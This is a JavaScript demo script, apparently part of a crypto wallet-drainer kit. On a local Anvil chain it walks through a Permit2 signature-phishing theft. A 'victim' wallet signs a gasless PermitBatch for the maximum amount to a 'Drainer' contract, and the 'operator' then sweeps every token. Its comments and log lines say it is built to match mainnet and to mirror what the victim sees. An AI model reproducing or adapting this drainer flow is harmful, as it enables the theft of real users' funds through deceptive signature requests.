/// End-to-end demo on a local Anvil node:
///   victim wallet -> Permit2 approval -> signed PermitBatch -> operator drains it.
/// Run: anvil (in another terminal), then `node ops/demo.mjs`.
import { readFileSync } from "node:fs";
import { Contract, ContractFactory, JsonRpcProvider, Wallet, parseUnits } from "ethers";
import { PERMIT2 } from "./lib.mjs";

const art = (p) => JSON.parse(readFileSync(p, "utf8"));
const provider = new JsonRpcProvider("http://127.0.0.1:8545", 31337, { staticNetwork: true });
const operator = new Wallet("0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d", provider);
const victim = new Wallet("0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a", provider);

let opNonce = await operator.getNonce();

async function deploy(artifact, ...args) {
  const factory = new ContractFactory(artifact.abi, artifact.bytecode, operator);
  const tx = await factory.getDeployTransaction(...args);
  const receipt = await (await operator.sendTransaction({ ...tx, nonce: opNonce++ })).wait();
  return new Contract(receipt.contractAddress, artifact.abi, operator);
}

const token = await deploy(art("out/MockERC20.sol/MockERC20.json"));
const tokenAddress = await token.getAddress();
const permit2Mock = await deploy(art("out/MockPermit2.sol/MockPermit2.json"));

// Put the replica at the canonical Permit2 address so domain + calls match mainnet.
await provider.send("anvil_setCode", [PERMIT2, await provider.getCode(await permit2Mock.getAddress())]);

const drainer = await deploy(art("out/Drainer.sol/Drainer.json"));
const drainerAddress = await drainer.getAddress();

await (await token.mint(victim.address, parseUnits("1000", 18), { nonce: opNonce++ })).wait();
await (await token.connect(victim).approve(PERMIT2, parseUnits("1000", 18))).wait();

const now = (await provider.getBlock("latest")).timestamp;
const max160 = (1n << 160n) - 1n;
const domain = { name: "Permit2", chainId: 31337, verifyingContract: PERMIT2 };
const types = {
  PermitDetails: [
    { name: "token", type: "address" },
    { name: "amount", type: "uint160" },
    { name: "expiration", type: "uint48" },
    { name: "nonce", type: "uint48" },
  ],
  PermitBatch: [
    { name: "details", type: "PermitDetails[]" },
    { name: "spender", type: "address" },
    { name: "sigDeadline", type: "uint256" },
  ],
};
const message = {
  details: [{ token: tokenAddress, amount: max160, expiration: now + 30 * 86400, nonce: 0 }],
  spender: drainerAddress,
  sigDeadline: now + 3600,
};

console.log("assinando PermitBatch (sem gas, como a vitima veria)...");
const signature = await victim.signTypedData(domain, types, message);

const tx = await drainer.permit2Batch(
  { details: message.details, spender: drainerAddress, sigDeadline: message.sigDeadline },
  victim.address,
  signature,
  { nonce: opNonce++ },
);
await tx.wait();

console.log("vitima :", (await token.balanceOf(victim.address)).toString());
console.log("operador:", (await token.balanceOf(operator.address)).toString());
console.log("drenado :", (await token.balanceOf(operator.address)) === parseUnits("1000", 18) ? "OK" : "FALHOU");
